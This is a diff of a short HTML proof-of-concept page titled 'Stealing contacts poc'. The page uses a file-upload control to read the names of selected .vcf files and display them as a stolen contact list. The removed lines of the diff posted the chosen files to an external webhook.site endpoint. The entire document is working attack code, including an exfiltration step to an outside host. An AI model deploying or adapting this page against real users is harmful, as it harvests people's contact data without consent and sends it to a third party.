@@ -1,8 +1,35 @@
-<form method="post" action="https://webhook.site/2bd7c2ff-fb8d-4597-99d0-27a85ae7328f" enctype="multipart/form-data">
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Stealing contacts poc</title>
+  </head>
+  <body>
+    <h1>Stealing contacts</h1>
+    <form method="post" action="#" enctype="multipart/form-data">
       <div>
         <label for="file">Choose file to upload</label>
-        <input type="file" id="file" name="file" accept="image/*" multiple onchange="form.submit()">
+        <input type="file" id="file" name="file[]" accept="*/*"  onchange="onc()">
       </div>
       <div>
       </div>
-</form>
+    </form> 
+    <div id="stolencontacts" style="margin-top: 50px;width:500px;height: 800px;">
+      <h1>contacts list</h1>
+    </div>
+  </body>
+  <script>
+    function onc() {
+      var files = document.getElementById("file").files;
+      for (var i = 0; i < files.length; i++) {
+          let textarea = document.getElementById("stolencontacts");
+          if(!files[i].name.startsWith("0r")){
+              var h2e = document.createElement("h2");
+              var bre = document.createElement("br");
+              h2e.innerText = files[i].name.split('.vcf')[0];
+              textarea.appendChild(h2e);
+              textarea.appendChild(bre);
+          }
+      }
+  }
+  </script>
+</html>
